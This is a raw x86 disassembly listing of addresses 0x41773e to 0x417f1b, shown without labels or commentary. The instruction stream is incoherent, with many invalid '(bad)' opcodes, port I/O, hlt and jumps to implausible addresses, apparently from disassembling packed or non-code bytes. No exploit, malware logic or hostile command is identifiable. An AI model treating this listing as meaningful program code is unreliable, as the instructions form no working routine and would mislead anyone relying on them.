  41773e:	lock rcl bh,0x8b
  417742:	cmp    DWORD PTR [esi],eax
  417744:	jmp    0xef54c0e
  417749:	leave  
  41774a:	rcl    BYTE PTR es:[edx],cl
  41774d:	int3   
  41774e:	mov    DWORD PTR [ebp-0x40],edi
  417751:	and    dh,ah
  417753:	xor    DWORD PTR [edx],ebp
  417755:	push   ebx
  417756:	mov    ecx,0x6fea48d
  41775b:	pushf  
  41775c:	in     eax,0x88
  41775e:	push   edx
  41775f:	lds    ecx,FWORD PTR [edi]
  417761:	xor    dl,BYTE PTR [edx+0x8]
  417764:	pop    edi
  417765:	push   0xac115fad
  41776a:	sub    BYTE PTR [eax],dh
  41776c:	pop    esi
  41776d:	or     ecx,DWORD PTR [edx+0x43f88043]
  417773:	cmp    edi,DWORD PTR [ecx]
  417775:	(bad)  
  417776:	rol    ebx,1
  417778:	pop    ecx
  417779:	push   ebp
  41777a:	fsubr  st,st(2)
  41777c:	addr16 push ebx
  41777e:	leave  
  41777f:	inc    esi
  417780:	bound  edx,QWORD PTR [ecx+0x7c47b6c0]
  417786:	gs ds fwait
  417789:	mov    bl,bh
  41778b:	addr16 xchg ebx,eax
  41778d:	fsub   QWORD PTR [eax+0x51]
  417790:	cmp    eax,0x760689aa
  417795:	and    DWORD PTR [edi],edx
  417797:	test   BYTE PTR [edx+0x183e4eaa],0xb9
  41779e:	les    eax,FWORD PTR [edx]
  4177a0:	test   eax,0xf65c658e
  4177a5:	push   edx
  4177a6:	ss in  eax,dx
  4177a8:	inc    edx
  4177a9:	cmp    BYTE PTR [edi],ch
  4177ab:	pop    esi
  4177ac:	mov    esp,ecx
  4177ae:	pop    es
  4177af:	jne    0x417753
  4177b1:	cmc    
  4177b2:	jp     0x4177df
  4177b4:	add    eax,DWORD PTR [ecx]
  4177b6:	fnsave [eax+0x3a]
  4177b9:	in     al,dx
  4177ba:	bound  esi,QWORD PTR [eax+ebx*2]
  4177bd:	stc    
  4177be:	in     al,dx
  4177bf:	rol    DWORD PTR [eax+0x1fc00bed],1
  4177c5:	clc    
  4177c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177c7:	mov    al,0x3e
  4177c9:	inc    ecx
  4177ca:	rol    dh,cl
  4177cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177cd:	dec    ebp
  4177ce:	jbe    0x417770
  4177d0:	test   eax,0x5e4c947d
  4177d5:	jecxz  0x417757
  4177d7:	jge    0x4177f3
  4177d9:	sub    BYTE PTR [edi+ecx*1+0x1c],dl
  4177dd:	add    esi,DWORD PTR [ecx]
  4177df:	pop    ebx
  4177e0:	add    cl,bh
  4177e2:	sbb    esi,0x65
  4177e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e6:	test   al,0xbd
  4177e8:	pop    ecx
  4177e9:	(bad)  
  4177eb:	mov    dl,0xac
  4177ed:	inc    ecx
  4177ee:	jo     0x41780d
  4177f0:	dec    eax
  4177f1:	mov    ah,0x7
  4177f3:	das    
  4177f4:	or     BYTE PTR [eax+0x9d523d],bl
  4177fa:	xchg   esp,eax
  4177fc:	pop    ecx
  4177fd:	test   al,0x30
  4177ff:	xchg   ecx,eax
  417800:	jl     0x4177c0
  417802:	pop    eax
  417803:	dec    ebx
  417804:	ins    DWORD PTR es:[edi],dx
  417805:	and    al,0xf
  417807:	adc    DWORD PTR [ecx+0x21],ebp
  41780a:	enter  0xd4d3,0x9
  41780e:	hlt    
  41780f:	push   esp
  417810:	pusha  
  417811:	sbb    eax,0x5e26f0e9
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
